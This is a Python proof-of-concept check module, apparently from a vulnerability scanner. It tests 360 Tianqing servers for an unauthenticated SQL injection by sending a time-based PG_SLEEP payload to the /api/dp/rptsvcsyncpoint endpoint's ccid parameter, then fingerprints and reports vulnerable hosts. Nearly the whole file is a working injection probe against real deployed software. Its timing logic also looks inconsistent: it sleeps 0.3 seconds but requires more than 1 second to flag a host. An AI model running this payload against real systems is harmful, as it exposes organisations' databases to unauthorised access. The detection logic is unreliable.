# -*- coding:utf-8 -*-
# 360天擎 前台SQL注入

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False


    def sql_test(self, url):
        resp = self.requestUtil.get(url + "/api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(0.3)--")
        if resp.elapsed.total_seconds() > 1:
            return True


    def fingerprint(self, service):
        try:
            if "360新天擎" in self.service.title:
                return True
        except:
            return False


    def poc(self, service: ServiceScan):
        try:
            if self.sql_test(service.url):
                return ["360天擎 前台SQL注入", "vuln path: <br>%s" % "/api/dp/rptsvcsyncpoint?ccid=1"]
        except:
            return []
